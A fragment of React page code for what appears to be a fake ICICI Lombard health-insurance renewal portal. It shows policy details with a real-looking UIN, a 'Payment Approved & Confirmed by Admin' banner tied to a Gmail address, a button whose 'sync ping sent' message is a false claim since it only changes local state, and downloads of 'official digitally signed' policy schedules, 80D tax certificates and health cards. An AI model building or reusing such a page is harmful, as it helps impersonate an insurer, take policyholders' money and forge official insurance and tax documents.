            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 pt-2 text-xs">
              <div className="bg-black/20 backdrop-blur-xs p-3 rounded-xl border border-white/15">
                <span className="text-emerald-300 text-[11px] font-bold block">Document Status</span>
                <strong className="text-white text-sm font-extrabold flex items-center gap-1.5 mt-0.5">
                  <Check className="w-4 h-4 text-emerald-400" />
                  Updated Successfully
                </strong>
              </div>

              <div className="bg-black/20 backdrop-blur-xs p-3 rounded-xl border border-white/15">
                <span className="text-emerald-300 text-[11px] font-bold block">Mobile App Sync</span>
                <strong className="text-white text-sm font-extrabold flex items-center gap-1.5 mt-0.5">
                  <Smartphone className="w-4 h-4 text-amber-400" />
                  IL TakeCare App
                </strong>
              </div>

              <div className="bg-black/20 backdrop-blur-xs p-3 rounded-xl border border-white/15">
                <span className="text-emerald-300 text-[11px] font-bold block">Sync Window</span>
                <strong className="text-white text-sm font-extrabold flex items-center gap-1.5 mt-0.5">
                  <Clock className="w-4 h-4 text-cyan-300" />
                  Within 2 Hours
                </strong>
              </div>
            </div>

            {/* Interactive App Refresh Trigger */}
            <div className="pt-2 flex flex-col sm:flex-row items-center justify-between gap-3 border-t border-white/15">
              <span className="text-xs text-emerald-200 font-medium">
                Tip: After 2 hours, pull down to refresh on your IL TakeCare home screen to see updated e-cards.
              </span>
              <button
                type="button"
                onClick={() => {
                  setIsAppRefreshed(true);
                  triggerToast('IL TakeCare App sync ping sent. Please refresh your IL TakeCare mobile app!');
                }}
                className="px-4 py-2 bg-amber-400 hover:bg-amber-300 text-slate-950 font-black rounded-xl text-xs flex items-center gap-2 cursor-pointer shadow-md transition-all active:scale-95 shrink-0"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${isAppRefreshed ? 'animate-spin' : ''}`} />
                <span>{isAppRefreshed ? 'App Refresh Triggered ✓' : 'Refresh IL TakeCare App'}</span>
              </button>
            </div>
          </div>

          {/* Policy Overview Summary Card */}
          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm space-y-4">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-100 pb-4">
              <div>
                <span className="text-[10px] font-extrabold uppercase bg-emerald-100 text-emerald-800 px-2.5 py-0.5 rounded border border-emerald-200">
                  {retrievedPolicy.policyStatus}
                </span>
                <h2 className="text-xl font-bold text-slate-900 mt-1">
                  ICICI Lombard Complete Health Insurance
                </h2>
                <div className="text-xs text-slate-500 font-medium">
                  Policy No: <strong className="font-mono text-slate-800">{retrievedPolicy.policyNumber}</strong> • Holder: <strong>{retrievedPolicy.customerName}</strong>
                </div>
                <div className="text-[11px] font-mono text-slate-500 pt-0.5">
                  Product Code: <strong>4128</strong> | UIN: <strong>ICIHLIP26052V092526</strong>
                </div>
              </div>

              <button
                onClick={resetAll}
                className="text-xs font-bold text-slate-700 bg-slate-100 border border-slate-200 px-3 py-1.5 rounded-lg hover:bg-slate-200 shrink-0 cursor-pointer self-start sm:self-auto"
              >
                Lookup Another Policy
              </button>
            </div>

            {/* Metrics grid */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-3 bg-slate-50 p-3.5 rounded-xl border border-slate-100 text-xs">
              <div>
                <span className="text-slate-500 block">Total Sum Insured</span>
                <strong className="text-slate-900 font-bold">₹{retrievedPolicy.totalSumInsured.toLocaleString('en-IN')}</strong>
              </div>
              <div>
                <span className="text-slate-500 block">Covered Members</span>
                <strong className="text-slate-900 font-bold">{retrievedPolicy.members.length} Members</strong>
              </div>
              <div>
                <span className="text-slate-500 block">Policy Validity</span>
                <strong className="text-slate-900 font-bold font-mono">
                  {retrievedPolicy.newPolicyEndDate || retrievedPolicy.previousPolicyEndDate}
                </strong>
              </div>
              <div>
                <span className="text-slate-500 block">Verified Email</span>
                <strong className="text-slate-900 font-bold font-mono">{gmailId || 'Verified'}</strong>
              </div>
            </div>
          </div>

          {/* PAYMENT APPROVAL STATUS BANNER */}
          {isPaymentApproved && (
            <div className="p-4 rounded-2xl bg-gradient-to-r from-emerald-50 via-teal-50 to-emerald-50 border border-emerald-300 text-xs text-emerald-950 space-y-2 animate-fadeIn">
              <div className="flex items-center justify-between flex-wrap gap-2">
                <div className="flex items-center gap-2 font-black text-emerald-900 text-sm">
                  <CheckCircle2 className="w-5 h-5 text-emerald-600 shrink-0" />
                  <span>Payment Approved & Confirmed by Admin</span>
                </div>
                <span className="px-2.5 py-0.5 rounded-full bg-emerald-600 text-white font-black text-[11px] uppercase tracking-wider">
                  {approvedTenure} Year Renewal Active
                </span>
              </div>
              <p className="text-emerald-900/90 font-medium leading-relaxed">
                Your health policy renewal has been authorized in the Admin Portal for a <strong className="font-black text-emerald-950 underline decoration-emerald-500">{approvedTenure} Year Plan</strong> ({getDocValidityPreview(approvedTenure || 1)}). The official digitally signed soft copy is generated for your approved <strong>{approvedTenure} Year</strong> tenure.
              </p>
            </div>
          )}

          {/* TENURE SELECTION OPTIONS (1 YEAR / 2 YEARS / 3 YEARS) */}
          <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-xs space-y-3">
            <div className="flex items-center justify-between">
              <label className="text-xs font-bold text-slate-800 uppercase tracking-wider flex items-center gap-1.5">
                <Clock className="w-3.5 h-3.5 text-[#EA580C]" />
                <span>Select Policy Tenure for Soft Copy Document</span>
              </label>
              {isPaymentApproved && (
                <span className="text-[11px] font-bold text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded border border-emerald-200">
                  Approved Cover: {approvedTenure} Year Plan
                </span>
              )}
            </div>

            {/* 3 Tenure Tabs / Cards */}
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              {[1, 2, 3].map((years) => {
                const isApprovedPlan = isPaymentApproved && approvedTenure === years;
                const isSelected = selectedDocTenure === years;
                const isOtherPlanWhenApproved = isPaymentApproved && approvedTenure !== years;

                return (
                  <div
                    key={years}
                    onClick={() => setSelectedDocTenure(years)}
                    className={`p-3.5 rounded-xl border transition-all cursor-pointer relative flex flex-col justify-between ${
                      isApprovedPlan
                        ? 'border-emerald-500 bg-emerald-50/50 ring-2 ring-emerald-400/40 shadow-xs'
                        : isSelected
                        ? 'border-[#EA580C] bg-orange-50/40 ring-1 ring-orange-300 shadow-xs'
                        : 'border-slate-200 bg-white hover:border-slate-300'
                    }`}
                  >
                    <div>
                      <div className="flex items-center justify-between">
                        <span className="text-sm font-black text-slate-900 flex items-center gap-1.5">
                          <span>{years} Year Plan</span>
                        </span>

                        {isApprovedPlan ? (
                          <span className="inline-flex items-center gap-1 text-[10px] font-black uppercase text-emerald-800 bg-emerald-100 px-2 py-0.5 rounded-full border border-emerald-300">
                            <Check className="w-3 h-3 stroke-[3]" />
                            <span>Approved</span>
                          </span>
                        ) : isOtherPlanWhenApproved ? (
                          <span className="inline-flex items-center gap-1 text-[10px] font-bold text-slate-500 bg-slate-100 px-2 py-0.5 rounded-full">
                            <Lock className="w-3 h-3" />
                            <span>Locked</span>
                          </span>
                        ) : (
                          <span className="text-[10px] font-bold text-[#EA580C] bg-orange-50 px-2 py-0.5 rounded-full">
                            {years === 1 ? 'Standard' : years === 2 ? '25% Disc' : '35% Disc'}
                          </span>
                        )}
                      </div>

                      <p className="text-[11px] text-slate-500 font-medium mt-1">
                        Validity: {getDocValidityPreview(years)}
                      </p>
                    </div>

                    <div className="mt-3 pt-2 border-t border-slate-100 flex items-center justify-between text-[11px]">
                      <span className="text-slate-600 font-semibold">
                        {isApprovedPlan ? (
                          <strong className="text-emerald-700 font-extrabold">Active Renewed Plan</strong>
                        ) : isOtherPlanWhenApproved ? (
                          <span className="text-slate-400">1-Year Was Approved</span>
                        ) : (
                          <span>Tenure Option</span>
                        )}
                      </span>
                      
                      <span className={`w-4 h-4 rounded-full flex items-center justify-center ${
                        isSelected ? 'bg-[#EA580C] text-white' : 'border border-slate-300'
                      }`}>
                        {isSelected && <Check className="w-2.5 h-2.5 stroke-[3]" />}
                      </span>
                    </div>
                  </div>
                );
              })}
            </div>

            {/* Informative notice when user clicks a different year than approved */}
            {isPaymentApproved && selectedDocTenure !== approvedTenure && (
              <div className="p-3 rounded-xl bg-amber-50 border border-amber-200 text-xs text-amber-900 flex items-start gap-2 animate-fadeIn">
                <AlertCircle className="w-4 h-4 text-amber-600 shrink-0 mt-0.5" />
                <div className="leading-relaxed">
                  <strong>Notice:</strong> Your renewal payment was approved in the admin portal for a <strong>{approvedTenure} Year Policy</strong>. In accordance with policy terms, the official soft copy downloaded will be for your approved <strong>{approvedTenure} Year</strong> tenure.
                </div>
              </div>
            )}
          </div>

          {/* Download Action Cards */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            
            {/* Policy Schedule */}
            <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm space-y-4 flex flex-col justify-between hover:border-[#EA580C] transition-all">
              <div className="space-y-1.5">
                <div className="w-10 h-10 rounded-xl bg-orange-100 text-[#EA580C] flex items-center justify-center font-bold">
                  <FileText className="w-5 h-5" />
                </div>
                <h3 className="font-bold text-slate-900 text-base pt-1">
                  Policy Schedule & 80D Tax Receipt ({isPaymentApproved ? approvedTenure : selectedDocTenure} Year)
                </h3>
                <p className="text-xs text-slate-500 leading-relaxed">
                  Includes full member details, premium breakup, 18% GST invoice, digital validation seal, and Section 80D income tax exemption certificate.
                </p>
                <div className="text-[11px] font-mono text-slate-600 pt-1">
                  Coverage: <strong>{getDocValidityPreview(isPaymentApproved ? (approvedTenure || 1) : selectedDocTenure)}</strong>
                </div>
              </div>

              <button
                id="btn-download-schedule-pdf"
                type="button"
                onClick={() => downloadSchedule()}
                className="w-full py-3.5 px-4 rounded-xl bg-[#EA580C] hover:bg-[#D97706] text-white font-extrabold text-xs shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer active:scale-98"
              >
                <Download className="w-4 h-4" />
                <span>Download {isPaymentApproved ? approvedTenure : selectedDocTenure} Year Policy Schedule (PDF)</span>
              </button>
            </div>

            {/* Health Cards */}
            <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm space-y-4 flex flex-col justify-between hover:border-slate-900 transition-all">
              <div className="space-y-1.5">
                <div className="w-10 h-10 rounded-xl bg-slate-900 text-amber-400 flex items-center justify-center font-bold">
                  <CreditCard className="w-5 h-5" />
                </div>
                <h3 className="font-bold text-slate-900 text-base pt-1">Cashless Member Health Cards</h3>
                <p className="text-xs text-slate-500 leading-relaxed">
                  Individual digital health ID cards for all {retrievedPolicy.members.length} covered family members for cashless hospital admissions across 14,000+ network hospitals.
                </p>
                <div className="text-[11px] font-mono text-slate-600 pt-1">
                  Valid Through: <strong>{getDocValidityPreview(isPaymentApproved ? (approvedTenure || 1) : selectedDocTenure)}</strong>
                </div>
              </div>

              <button
                id="btn-download-healthcards-pdf"
                type="button"
                onClick={downloadHealthCard}
                className="w-full py-3.5 px-4 rounded-xl bg-slate-900 hover:bg-slate-800 text-white font-extrabold text-xs shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer active:scale-98"
              >
                <Download className="w-4 h-4 text-amber-400" />
                <span>Download All Health Cards (PDF)</span>
              </button>
            </div>

          </div>

        </div>
      )}

    </div>
  );
};


